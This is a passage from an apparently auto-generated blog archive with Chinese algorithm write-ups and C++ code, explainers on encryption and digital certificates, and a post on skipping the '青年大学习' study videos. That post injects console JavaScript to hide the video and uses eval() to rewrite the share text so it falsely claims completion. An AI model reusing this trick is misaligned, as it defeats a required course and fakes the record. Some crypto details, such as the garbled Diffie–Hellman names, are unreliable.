i++) &#123; if(yy == x[i]) return false; if(abs(xx - i) == abs(yy - x[i])) return false; &#125; return true;&#125;void queen(int n)&#123; if(n == 8)&#123;ans = max(ans,sum);return;&#125; for(int i = 0; i &lt; 8; i++) &#123; if(check(n,i)) &#123; x[n] = i; sum += map[n][i]; queen(n+1); x[n] = -1; sum -= map[n][i]; &#125; &#125;&#125;int main()&#123; int t; scanf(\"%d\",&amp;t); while(t--) &#123; ans = 0; sum = 0; for(int i = 0; i &lt; 8; i++) for(int j = 0; j &lt; 8; j++) scanf(\"%d\",&amp;map[i][j]); memset(x,-1,sizeof(x)); queen(0); printf(\"%d\\n\",ans); &#125; return 0;&#125; 0x0C 组合运算式题目描述请考虑一个被空格分隔的，由1到N的整数组成的递增数列：1 2 3 …N。现在请在数列中插入表示加的“+”，或者表示减“-”，亦或者表示空白的“ ”(例如1-2 3就等于1-23)，来将每一对数字组合成一个表达式（第一个数字前无空格）。计算该表达式的结果并判断其值是否为0。请你写一个程序找出所有产生和为零的长度为N的数列。 输入输入为一行，包含一个整数N，3*≤N≤*9。 输出输出为所有在每对数字间插入“+”, “-”, 或 “ ”后能得到和为零的数列，并按照字典（ASCII码）序排列。 样例输入17 样例输出1234561+2-3+4-5-6+71+2-3-4+5+6-71-2 3+4+5+6+71-2 3-4 5+6 71-2+3+4-5+6-71-2-3-4-5+6+7 代码123456789101112131415161718192021222324252627282930313233343536373839#include&lt;iostream&gt;#include&lt;stdio.h&gt;using namespace std;int n;int OP[15] = &#123;1,1&#125;;void dfs(int d,int sum,int pre,int s)&#123; sum += pre; if(d == n) &#123; if(!sum) &#123; printf(\"1\"); for(int i = 2; i &lt;= n; i++) &#123; if(!OP[i]) printf(\" %d\",i); else if(OP[i] == 1) printf(\"+%d\",i); else printf(\"-%d\",i); &#125; printf(\"\\n\"); &#125; return; &#125; if(s&lt;=3)&#123; OP[d+1] = 0; if(pre &gt;= 0) dfs(d+1,sum-pre,pre*10+d+1,s+1); else dfs(d+1,sum-pre,pre*10-d-1,s+1); &#125; OP[d+1] = 1; dfs(d+1,sum,d+1,s); OP[d+1] = 2; dfs(d+1,sum,-d-1,s);&#125;int main()&#123; scanf(\"%d\",&amp;n); dfs(1,0,1,0); return 0;&#125; 0x0D 无脑博士的试管们题目描述无脑博士有三个容量分别是 A,B,C 升的试管，A,B,C分别是三个从 1到 20的整数，最初，A 和 B 试管都是空的，而 C 试管是装满硫酸铜溶液的。有时，无脑博士把硫酸铜溶液从一个试管倒到另一个试管中，直到被灌试管装满或原试管空了。当然每一次灌注都是完全的。由于无脑博士天天这么折腾，早已熟练，溶液在倒的过程中不会有丢失。 写一个程序去帮助无脑博士找出当 A 试管是空的时候，C 试管中硫酸铜溶液所剩量的所有可能性。 输入多组测试用例，对于每组测试用例，输入包括一行，为空格分隔开的三个数，分别为整数 A,B,C。 输出输出包括一行，升序地列出当 A 试管是空的时候，C 试管溶液所剩量的所有可能性。 样例输入12 5 10 样例输出15 6 7 8 9 10 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;iostream&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;set&gt;using namespace std;set&lt;int&gt; s;int na,nb,nc;bool visited[25][25][25];void dfs(int a,int b,int c)&#123; if(visited[a][b][c]) return; visited[a][b][c] = true; if(!a) s.insert(c); if(a &lt;= nb-b) dfs(0,a+b,c); else dfs(a-nb+b,nb,c); if(b &lt;= na-a) dfs(a+b,0,c); else dfs(na,a-na+b,c); if(a &lt;= nc-c) dfs(0,b,a+c); else dfs(a-nc+c,b,nc); if(c &lt;= na-a) dfs(a+c,b,0); else dfs(na,b,c-na+a); if(b &lt;= nc-c) dfs(a,0,b+c); else dfs(a,b-nc+c,nc); if(c &lt;= nb-b) dfs(a,b+c,0); else dfs(a,nb,c-nb+b);&#125;int main()&#123; while(~scanf(\"%d %d %d\",&amp;na,&amp;nb,&amp;nc)) &#123; s.clear(); memset(visited,0,sizeof(visited)); dfs(0,0,nc); set&lt;int&gt;::iterator it = s.begin(); printf(\"%d\",*it); it++; for(; it != s.end(); it++) &#123; printf(\" %d\",*it); &#125; printf(\"\\n\"); &#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"快速跳过青年大学习","slug":"快速跳过青年大学习","date":"2020-09-12T05:15:01.000Z","updated":"2020-12-03T13:54:14.355Z","comments":true,"path":"2020/09/12/qingniandaxuexi/","link":"","permalink":"http://aotle.top/2020/09/12/qingniandaxuexi/","excerpt":"本教程适用于安卓手机","text":"本教程适用于安卓手机 准备既然要优雅地完成大学习，首先得让微信给我们一个输入自己的代码的机会 按照如下步骤可以打开微信的开发工具 微信浏览器网页打开http://debugx5.qq.com打开下面两项，就可以调试了 可以将这个网址发给一个好友，就能够在微信里面打开了 开始打开青年大学习，进入视频播放页面，会发现右下角出现一个绿色的vConsole图标，点击它会出现如下界面。 输入以下代码： 12$('.section3').addClass('topindex1');$('.section4,#Cvideo').hide(); 点击ok即可快速跳过 微信朋友圈分享使用上面的代码快速完成大学习后，使用微信分享仍然是未完成状态 查阅资料后得知导致这一问题的原因是腾讯分享的sdk标题是网站自定义的，只好通过下面的代码来重新配置腾讯分享sdk来达到正常效果 12345678910var title = document.title;var newtitle = title.slice(0, 7) + \"网上主题团课\" + title.slice(7);$(\"script\").each(function () &#123; var content = $(this).text(); if (content.indexOf(title)!=-1) &#123; var script = content.replace(title,\"满分！我完成了\"+newtitle+\"，你也来试试吧\"); eval(script); &#125;&#125;); 方案比较暴力，因为对应的dom元素没有id，只好查找替换了 效果 但是为什么是这样的要搞清楚为什么是这样的，那就得使用调试工具对源代码一探究竟了 使用usb线将手机连接到电脑，打开手机的usb调试功能，并对电脑链接进行授权 （这里可能有人想问为啥不使用桌面版chrome的开发者工具直接调试网站，博主刚开始尝试使用桌面版chrome加载该网站时无论使用任何办法都无法将其切换到移动版的学习界面，可能是本人技术不够吧） 授权在微信内复制学习页面的链接，使用移动版chrome进入到开始学习页面，使用桌面版chrome打开chrome://inspect/#devices 稍等片刻后就可以显示出chrome打开的网站 点击inspect即可开始调试该网页 在某个script标签内找到了如下代码 既然视频结束后肯定要暂停视频并且显示某个页面，那么就把代码粘贴到console试试 成功!","categories":[{"name":"javascript","slug":"javascript","permalink":"http://aotle.top/categories/javascript/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://aotle.top/tags/javascript/"}]},{"title":"对称加密和非对称加密","slug":"对称加密和非对称加密","date":"2020-09-10T14:31:16.000Z","updated":"2020-12-03T13:53:14.429Z","comments":true,"path":"2020/09/10/jiami1/","link":"","permalink":"http://aotle.top/2020/09/10/jiami1/","excerpt":"介绍了对称加密和非对称加密","text":"介绍了对称加密和非对称加密 对称加密（Symmetric Cryptography），又称私钥加密对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）,这种方法在密码学中叫做对称加密算法。对称加密有很多种算法，由于它效率很高，所以被广泛使用在很多加密协议的核心当中。对称加密通常使用的是相对较小的密钥，一般小于256 bit。因为密钥越大，加密越强，但加密与解密的过程越慢。如果你只用1 bit来做这个密钥，那黑客们可以先试着用0来解密，不行的话就再用1解；但如果你的密钥有1 MB大，黑客们可能永远也无法破解，但加密和解密的过程要花费很长的时间。密钥的大小既要照顾到安全性，也要照顾到效率，是一个trade-off。 非对称加密（Asymmetric Cryptography），又称公钥加密1976年，美国学者Dime和Henman为解决信息公开传送和密钥管理问题，提出一种新的密钥交换协议，允许在不安全的媒体上的通讯双方交换信息，安全地达成一致的密钥，这就是“公开密钥系统”。相对于“对称加密算法”这种方法也叫做“非对称加密算法”。非对称加密为数据的加密与解密提供了一个非常安全的方法，它使用了一对密钥，公钥（public key）和私钥（private key）。私钥只能由一方安全保管，不能外泄，而公钥则可以发给任何请求它的人。非对称加密使用这对密钥中的一个进行加密，而解密则需要另一个密钥。比如，你向银行请求公钥，银行将公钥发给你，你使用公钥对消息加密，那么只有私钥的持有人–银行才能对你的消息解密。与对称加密不同的是，银行不需要将私钥通过网络发送出去，因此安全性大大提高。 优缺点对称密钥加密我们从定义中应该就可以明白，它是信息的发送方和接收方都用同一个秘钥去加密和解密数据。这样做它的最大优势是加/解密速度快，适合于对大数据量进行密，但密钥管理困难，密钥在网络传输的过程种容易被窃取。 非对称密钥加密，它需要使用“一对”密钥来分别完成加密和解密操作，一个公开发布，即公开密钥，另一个由用户自己秘密保存，即私用密钥。信息发送者用公开密钥去加密，而信息接收者则用私用密钥去解密。公钥机制灵活，但加密和解密速度却比对称密钥加密慢得多。非对称密钥加密的使用过程： A要向B发送信息，A和B都要产生一对用于加密和解密的公钥和私钥。 A的私钥保密，A的公钥告诉B；B的私钥保密，B的公钥告诉A。 A要给B发送信息时，A用B的公钥加密信息，因为A知道B的公钥。 A将这个消息发给B（已经用B的公钥加密消息）。 B收到这个消息后，B用自己的私钥解密A的消息，其他所有收到这个报文的人都无法解密，因为只有B才有B的私钥。 反过来，B向A发送消息也是一样。 从上面大家应该可以看出对称加密和非对称加密的区别，下面稍微进行一下总结： （1） 对称加密加密与解密使用的是同样的密钥，所以速度快，但由于需要将密钥在网络传输，所以安全性不高。（2） 非对称加密使用了一对密钥，公钥与私钥，所以安全性高，但加密与解密速度慢。（3） 解决的办法是混合加密——将对称加密的密钥使用非对称加密的公钥进行加密，然后发送出去，接收方使用私钥进行解密得到对称加密的密钥，然后双方可以使用对称加密来进行沟通。 混合加密是目前在通信方面最安全的做法。","categories":[{"name":"密码学","slug":"密码学","permalink":"http://aotle.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"密码学","slug":"密码学","permalink":"http://aotle.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"数字签名和数字证书","slug":"数字签名和数字证书","date":"2020-09-10T14:18:38.000Z","updated":"2020-12-03T13:55:03.685Z","comments":true,"path":"2020/09/10/shuziqianming1/","link":"","permalink":"http://aotle.top/2020/09/10/shuziqianming1/","excerpt":"介绍了数字签名和数字证书","text":"介绍了数字签名和数字证书 散列函数和消息摘要一段信息，经过摘要算法(散列函数)得到一串哈希值，就是摘要(dijest)。 信息是任意长度，而摘要是定长。 摘要算法有MD5、SHA1、SHA256、SHA512等，算法把无限的映射成有限，因此可能会有碰撞（两个不同的信息，算出的摘要相同） 摘要不同于加密算法，因为不存在解密，只不过从摘要反推原信息很难（可以认为能加密但无法解密还原，但可以用于比对）。类比到人的话：时间一直向前走 ，我没有办法从现在的你身上反观到你过去的样子，也没法从现在的他身上反观到他过去的样子……但你们现在的样子依然有作用，那就是在于“是否相同”：我可以通过比对现在的你和现在的他是否相同，来判断过去的你和他是否相同，而无需知道过去的你和过去的他具体是什么样子。 摘要相同，信息一定相同。如果两张图片的md5相同，说明图片完全一样。 一个安全的摘要算法需要满足： 1、输入长度是任意的，输出是固定的 2、对每一个给定的输入,计算输出是很容易的 3、给定H,找到两个不同的输入，输出同一个值在计算上不可行 4、给定H和一个消息x,找到另一个不同的消息y，使它们散列到同一个值在计算上不可行 常见的散列算法：MD2、MD4、MD5、SHA、SHA-1 数字签名数字签名是指发送方以电子形式签名一个消息或文件，签名后的消息或文件能在网络中传输，并表示签名人对该消息或文件的内容负有责任。数字签名综合使用了消息摘要和非对称加密技术，可以保证接受者能够核实发送者对报文的签名，发送者事后不抵赖报文的签名，接受者不能篡改报文内容和伪造对报文的签名。 数字签名需要做到两点： 1、确认信息是由签名者发送的； 2、确认信息从签发到接受没有被修改过。 数字签名的过程与示意图： 1、发送方要发送消息运用散列函数（MD5、SHA-1等）形成消息摘要； 2、发送方用自己的私钥对消息摘要进行加密，形成数字签名； 3、发送方将数字签名附加在消息后发送给接收方； 4、接受方用发送方的公钥对签名信息进行解密，得到消息摘要； 5、接收方以相同的散列函数对接收到的消息进行散列，也得到一份消息摘要； 6、接收方比较两个消息摘要，如果完全一致，说明数据没有被篡改，签名真实有效；否则拒绝该签名。 如果通信的内容是加密的，就需要采用数字信封：发送方用对称密钥加密明文，然后用对方的公钥加密对称密钥发送给对方，对方收到电子信封，用自己的私钥解密，得到对称密钥解密，还原明文。此时数字签名的过程如下： 1、发送方要发送消息运用散列函数（MD5、SHA-1等）形成消息摘要； 2、发送方用自己的私钥对消息摘要进行加密，形成数字签名； 3、发送方用对称加密算法对消息原文、数字签名进行加密，得到密文信息； 4、发送方用接收方的公钥加密对称加密算法的密钥进行加密，形成数字信封； 5、发送方将3中的密文信息和数字信封一起发给接收方； 6、接收方首先用自己的私钥解密数字信封，还原对称加密算法的密钥； 7、接受方用6中的密钥解密接收到的密文，得到原文信息和数字签名； 8、接受方用发送方的公钥对签名信息进行解密，得到消息摘要； 9、接收方以相同的散列函数对接收到的消息进行散列，也得到一份消息摘要； 10、接收方比较两个消息摘要，如果完全一致，说明数据没有被篡改，签名真实有效；否则拒绝该签名。 数字证书数字签名中“公钥”可能被攻击者替换，为了保证“公钥”是可信的，数字证书应运而生。 数字证书是一种权威的电子文档，由权威公正的第三方认证机构（CA）签发，广泛用于涉及需要身份认证和数据安全的领域。 注意这里有两个不同的非对称算法（对应2个公钥私钥对），一个算法是发送方加密摘要的，用于生成数字签名；另一个算法是CA加密发送方公钥的，用于生成数字证书。两个算法相互独立，没有必然联系。 发送时不仅发送内容、数字签名，还包含发送方的数字证书。接收方拿到后，首先从数字证书中解密出发送方公钥（用的是CA的公钥和CA解密算法），这个公钥必然是可信的。然后就是和前面一样的流程，拿发送方公钥去解密数字证书，得到摘要；最后比对摘要是否一致。 CA是第三方权威机构，CA公钥是公开的，因此不可能伪造。 @example : https 工作流程，基本分为三个阶段：1、认证服务器。浏览器内置一个受信任的CA机构列表，并保存了这些CA机构的证书。第一阶段服务器会提供经CA机构认证颁发的服务器证书，如果签发该证书的CA，存在于浏览器的受信任CA列表中（也就是签发该证书的CA的根证书，能够与客户端中保存的CA根证书比对上），说明这个CA是可信任的，可以保证证书不假。然后，再进一步判断服务器证书中的信息与当前正在访问的网站（域名等）一致，那么浏览器就认为服务端是可信的，并从服务器证书中取得服务器公钥，用于后续流程。否则，浏览器将提示用户，根据用户的选择，决定是否继续。 客户端是否能够信任这个站点的证书，首先取决于客户端程序是否导入了证书颁发者的根证书。 2、协商会话密钥。客户端在认证完服务器，获得服务器的公钥之后，利用该公钥与服务器进行加密通信，协商出两个会话密钥，分别是用于加密客户端往服务端发送数据的客户端会话密钥，用于加密服务端往客户端发送数据的服务端会话密钥。在已有服务器公钥，可以加密通讯的前提下，还要协商两个对称密钥的原因，是因为非对称加密相对复杂度更高，在数据传输过程中，使用对称加密，可以节省计算资源。另外，会话密钥是随机生成，每次协商都会有不一样的结果，所以安全性也比较高。 3、加密通讯。此时客户端服务器双方都有了本次通讯的会话密钥，之后传输的所有Http数据，都通过会话密钥加密。这样网路上的其它用户，将很难窃取和篡改客户端和服务端之间传输的数据，从而保证了数据的私密性和完整性。 IE浏览器在验证证书的时候主要从下面三个方面考察，只要有任何一个不满足都将给出警告 证书的颁发者是否在“根受信任的证书颁发机构列表”中 证书是否过期 证书的持有者是否和访问的网站一致 数字证书种类： 1、服务器证书：证明服务器的身份和进行通信加密，客户端可以与服务器端建立SSL连接，然后通信数据都会被加密。 2、电子邮件证书：证明电子邮件发件人的真实性，也可发送加密邮件，只有接收方才能打得开。 3、客户端证书：主要用于身份验证和数字签名，安全的客户端证书经常存储的专门的USBKey中，使用的时候需要输入保护密码，以防被导出和复制，如指纹识别、语音播报、带显示器的USBKey等等。 数字证书功能： 1、信息保密 2、身份确认 3、不可否认性 4、数据完整性 数字证书的格式： 最简单的可以是：公钥、名称和证书授权中心的数字签名，目前 X.509 是一种通用的证书格式，它的第三个版本目前使用广泛，证书内容包括：版本、序列号、签名算法标识、签发者、有效期、主体、主体公开密钥、CA的数字签名、可选型等等","categories":[{"name":"密码学","slug":"密码学","permalink":"http://aotle.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"密码学","slug":"密码学","permalink":"http://aotle.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"二分与三分","slug":"二分与三分","date":"2020-09-10T10:10:44.000Z","updated":"2020-11-30T11:06:39.264Z","comments":true,"path":"2020/09/10/erfenchazhao2/","link":"","permalink":"http://aotle.top/2020/09/10/erfenchazhao2/","excerpt":"这是一篇用二分和三分求方程的根的博客","text":"这是一篇用二分和三分求方程的根的博客 二分法求方程的根如果有函数发f(x)，它在区间[a, b]上递增或者递减，并且f(a)*f(b)&lt;0。那么我们知道函数必然有一个等于0的解，而且这个解我们可以用二分法来求近似解。 然后通过二分法缩小范围，直到区间长度足够小，这时候就说明找到了一个误差不超过区间长度的近似解。 在二分法当中，我们没进行一次二分迭代，区间的长度就会缩减一半，这是一个指数级的缩减。所以即使一开始的区间很大，经过二分迭代也可以迅速缩减，得到一个非常精准的结果，并且和泰勒级数一样，除了能得到一个足够精确的值之外，还能得到误差的范围。（注：函数可以不是严格单调的，二分法只需要满足f(a)*f(b)&lt;0，函数连续并且只有一个零点）。 @example1用二分法求f(x)&#x3D;x*x*x-7.7*x*x+19.2*x-15.3在区间[1,2]之间的根． 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;math.h&gt;const double eps = 1e-6; //定义我们计算的精度double a,b,c,d; //假定我们输入的函数是一元三次方程组，a*x*x*x+b*x*x+c*x+d=0double f(double x) //定义我们的函数&#123;return a*x*x*x+b*x*x+c*x+d;&#125;int main()&#123; double m,n;//求根区间[m,n] double i,j,sum; printf(\"请输入一元三次方程组的系数：a,b,c,d:\"); scanf(\"%lf%lf%lf%lf\",&amp;a,&amp;b,&amp;c,&amp;d); printf(\"\\n请输入求根区间[m,n]:\"); scanf(\"%lf%lf\",&amp;m,&amp;n); if(f(m)*f(n)&lt;0) &#123; while(fabs(m-n)&gt;eps) &#123; i=(m+n)/2.0; sum=f(i); printf(\"[%lf %lf]\\n\",m,n); if(fabs(sum)&lt;eps) &#123; break; //printf(\"\\n该方程组的近似根为:x2*=%lf\\n\",i); //return 1; &#125; else if(f(i)*f(m)&lt;0) &#123; n=i; //修正区间，将[m,n]换成[m,i],这里的i是中点 &#125; else if(f(i)*f(n)&lt;0) &#123; m=i;//修正区间，将[m,n]换成[i,n],这里的i是中点 &#125; &#125; &#125; printf(\"%lf %lf\",m,n); j=(m+n)/2; printf(\"\\n该方程组的近似根为:x*=%lf\\n\",j);&#125; 三分查找1.概念在二分查找的基础上，在右区间（或左区间）再进行一次二分，这样的查找算法称为三分查找，也就是三分法。 三分查找通常用来迅速确定最值。 二分查找所面向的搜索序列的要求是：具有单调性（不一定严格单调）；没有单调性的序列不是使用二分查找。与二分查找不同的是，三分法所面向的搜索序列的要求是：序列为一个凸性函数。通俗来讲，就是该序列必须有一个最大值（或最小值），在最大值（最小值）的左侧序列，必须满足不严格单调递增（递减），右侧序列必须满足不严格单调递减（递增）。如下图，表示一个有最大值的凸性函数： 2.算法思路（1）与二分法类似，先取整个区间的中间值mid。 1mid = (left + right) / 2; （2）再取右侧区间的中间值midmid，从而把区间分为三个小区间。 1midmid = (mid + right) / 2; （3）我们mid比midmid更靠近最值，我们就舍弃右区间，否则我们舍弃左区间？。 比较mid与midmid谁最靠近最值，只需要确定mid所在的函数值与midmid所在的函数值的大小。当最值为最大值时，mid与midmid中较大的那个自然更为靠近最值。最值为最小值时同理。 1234if (cal(mid) &gt; cal(midmid)) right = midmid;else left = mid; （4）重复（1）（2）（3）直至找到最值。 算法的正确性： 1、mid与midmid在最值的同一侧。由于凸性函数在最大值（最小值）任意一侧都具有单调性，因此，mid与midmid中，更大（小）的那个数自然更为靠近最值。此时，我们远离最值的那个区间不可能包含最值，因此可以舍弃。 2、mid与midmid在最值的两侧。由于最值在中间的一个区间，因此我们舍弃一个区间后，并不会影响到最值。 @example123456789101112131415161718192021222324const double EPS = 1e-10; double calc(double x)&#123; // f(x) = -(x-3)^2 + 2; return -(x-3.0)*(x-3.0) + 2;&#125; double ternarySearch(double low, double high)&#123; double mid, midmid; while (low + EPS &lt; high) &#123; mid = (low + high) / 2; midmid = (mid + high) / 2; double mid_value = calc(mid); double midmid_value = calc(midmid); if (mid_value &gt; midmid_value) high = midmid; else low = mid; &#125; return low;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"递归方程求解方法","slug":"递归方程求解方法","date":"2020-09-10T09:15:45.000Z","updated":"2020-12-03T13:52:14.352Z","comments":true,"path":"2020/09/10/diguifangcheng/","link":"","permalink":"http://aotle.top/2020/09/10/diguifangcheng/","excerpt":"这是一篇关于递归方程求解的简单方法","text":"这是一篇关于递归方程求解的简单方法","categories":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"算法考试复习","slug":"算法考试复习","date":"2020-09-08T10:47:20.000Z","updated":"2020-12-03T13:55:17.330Z","comments":true,"path":"2020/09/08/algorithm1/","link":"","permalink":"http://aotle.top/2020/09/08/algorithm1/","excerpt":"这是一篇算法实验课考试复习","text":"这是一篇算法实验课考试复习 递归与分治内部收益率题目描述 输入 输出对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。 样例输入123451-1 22-8 6 90 样例输出121.000.50 代码12345678910111213141516171819202122232425262728293031#include&lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;int main()&#123; int n, f, CF[12]; while (cin&gt;&gt;n &amp;&amp; n != 0) &#123; cin &gt;&gt; f; double mid, high = 10000, low = -1, r, k, sum; for (int i = 0; i &lt; n; i++) cin &gt;&gt; CF[i]; while (high - low &gt; 1.0e-6) &#123; mid = (high + low) / 2; k = 1; sum = 0; for (int j = 0; j &lt; n; j++) &#123; k *= (1.0 / (1 + mid)); sum += CF[j] * k; &#125; if (sum + f &gt; 0) low = mid; else high = mid; &#125; cout &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; mid &lt;&lt; endl; &#125; return 0;&#125; 问题 J: 奶牛的聚会题目描述农历新年马上就要到了，奶牛们计划举办一次聚会庆祝新年的到来。但是，奶牛们并不喜欢走太远的路，这会给他们的聚会带来消极情绪，当一头奶牛的消极指数为Wi，他参加聚会所需行走的距离为si，那么他就会给聚会带来Si3*Wi的消极情绪。所有奶牛所在位置都在一条直线上，已知所有奶牛的坐标和消极指数，求如何确定聚会地点，使得所有奶牛给聚会带来的消极情绪之和最小，输出消极情绪之和的最小值。 输入第一行包含一个整数 Ca(Ca&lt;=20) ，表示有 Ca 组测试数据。 对于每组测试数据：第一行包含一个整数n(1&lt;=n&lt;=50000) ，表示奶牛的数量。接下来 n 行每行包含两个浮点数Si和wi (-106&lt;=Si&lt;=106, 0&lt;Wi&lt;15)。 输出对于每组测试数据，输出 “Case #c: ans” ，其中c表示测试数据编号，ans表示消极情绪之和的最小值，结果四舍五入为一个整数。 样例输入1234567150.9 21.4 43.1 16.2 18.3 2 样例输出1Case #1: 300 思路三分查找法确定消极情绪之和最小的位置，结合注释应该不难理解。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include &lt;math.h&gt;using namespace std;typedef long long ll;const int maxn = 50010;double Si[maxn], wi[maxn];int n, Ca;//计算聚会位置在pos时的消极情绪之和double ans(double pos)&#123; double sum = 0; for (int i = 0; i &lt; n; i++) &#123; //计算每个奶牛距离聚会位置的距离(非负) double dist = Si[i] - pos; if (dist &lt; 0) dist = -dist; sum += pow(dist, 3) * wi[i]; &#125; return sum;&#125;int main()&#123; cin &gt;&gt; Ca; for (int i = 1; i &lt;= Ca; i++) &#123; cin &gt;&gt; n; for (int j = 0; j &lt; n; j++) &#123; cin &gt;&gt; Si[j] &gt;&gt; wi[j]; &#125; //找到坐标位置最小的奶牛 double low = Si[0]; for (int k = 0; k &lt; n; k++) if (Si[k] &lt; low) low = Si[k]; //找到坐标位置最小的奶牛 double high = Si[0]; for (int l = 0; l &lt; n; l++) if (Si[l] &gt; high) high = Si[l]; //三分查找法确定最终位置 while (high - low &gt; 1e-7) &#123; double m1 = (high + low) / 2.0; double m2 = (m1 + high) / 2.0; if (ans(m1) &gt; ans(m2)) low = m1; else high = m2; &#125; cout &lt;&lt; \"Case #\" &lt;&lt; i &lt;&lt; \": \" &lt;&lt; ll(ans(low) + 0.5) &lt;&lt; endl; &#125; return 0;&#125; 问题 E: 光合作用题目描述蒜头是个爱学习的孩子，他总喜欢在生活中做一些小实验，这次蒜头想研究一下光合作用。蒜头的实验材料有如下几样：神奇的种子，普通的纸箱和一些光源。一开始，蒜头将种子均匀的种在了箱子底部，你可以将其看成 X 轴，种子的位置为 X 轴上的点。然后蒜头用纸板将箱子盖住，并在纸板上安装了一些光源（具体见图，顶上的为光源，光源两边与顶部的夹角都为45度，黄色部分为光照，绿色的为植物。）。神奇的种子会在有光的情况下一直向上生长直到没光为止。现在蒜头想知道当实验结束时每颗种子的高度是多少？ 输入第一行输入一个整数 T，表示测试数据的组数。 每组数据的第一行是三个整数 n,m,h(1&lt;=n,m&lt;=1e5,0&lt;=m&lt;=1e5,1&lt;=h&lt;=1e4),n表示种子数(编号为1,2…n)，m表示光源数,h 表示箱子的高度。 接下来m行，每行一个整数Xi表示第i个光源在顶部的位置。 输出对于每组测试数据，请输出n行，每行一个数表示第i颗种子的最终高度。 样例输入1234567827 1 244 4 11234 样例输出123456789101100121001111 思路二分法 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;algorithm&gt;using namespace std;/*********************************************************************************************lower_bound( begin,end,num)：从数组的begin位置到end-1位置二分查找第一个大于或等于num的数字，找到返回该数字的地址，不存在则返回end。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。upper_bound( begin,end,num)：从数组的begin位置到end-1位置二分查找第一个大于num的数字，找到返回该数字的地址，不存在则返回end。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。********************************************************************************************/const int maxn = 1e5 + 5;int x[maxn];int main()&#123; int T; cin &gt;&gt; T; while (T--) &#123; int n, m, h; cin &gt;&gt; n &gt;&gt; m &gt;&gt; h; for (int i = 1; i &lt;= m; i++) &#123; cin &gt;&gt; x[i]; &#125; sort(x + 1, x + m + 1); for (int i = 1; i &lt;= n; i++) &#123; int ans = 0; int cnt = lower_bound(x + 1, x + m + 1, i) - x; if (cnt == 1 &amp;&amp; m != 0) &#123; ans = max(ans, h - x[cnt] + i); &#125; else if (cnt == m + 1 &amp;&amp; m != 0) &#123; ans = max(ans, h - i + x[cnt - 1]); &#125; else if (m != 0) &#123; ans = max(0, max(h - i + x[cnt - 1], h - x[cnt] + i)); &#125; cout &lt;&lt; ans &lt;&lt; endl; &#125; &#125; return 0;&#125; 动态规划跳台阶题目描述一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 输入多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100) 输出每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量. 所得到的结果模1000000007 样例输入1234 样例输出1235 思路可以有多种方法，我这里选用动态规划。 dp[i]表示i阶台阶的跳法有多少种，一次只能跳一阶或两阶。 已知dp[1]=1,dp[2]=2，所以dp[i]=dp[i-1]+dp[i-2]，表示：到达i阶 = （最后一步跳一阶到达i）+ (最后一步跳两阶到达i) 代码12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;typedef long long ll;int dp[105];int climb(int n)&#123; if (n == 1) return 1; dp[1] = 1; dp[2] = 2; for (int i = 3; i &lt;= n; i++) &#123; dp[i] = (dp[i - 1] + dp[i - 2]) % 1000000007; &#125; return dp[n];&#125;int main()&#123; int n; while (cin &gt;&gt; n) &#123; cout &lt;&lt; climb(n) &lt;&lt; endl; &#125; return 0;&#125; 最长公共子序列题目描述给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？ 输入输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。 输出对于每组输入，输出两个字符串的最长公共子序列的长度。 样例输入123abcfbc abfcabprogramming contest abcd mnp 样例输出123420 思路 代码12345678910111213141516171819202122232425262728293031323334#include&lt;iostream&gt;#include&lt;string.h&gt;using namespace std;const int MAXN = 105;int main()&#123; char x[MAXN], y[MAXN]; int c[MAXN][MAXN] = &#123; 0 &#125;; while (cin &gt;&gt; x &gt;&gt; y) &#123; int m = strlen(x); int n = strlen(y); for (int i = 1; i &lt;= m; i++) &#123; for (int j = 1; j &lt;= n; j++) &#123; if (x[i-1] == y[j-1]) &#123; c[i][j] = c[i - 1][j - 1] + 1; &#125; else if (c[i - 1][j] &gt; c[i][j - 1]) &#123; c[i][j] = c[i - 1][j]; &#125; else &#123; c[i][j] = c[i][j - 1]; &#125; &#125; &#125; cout 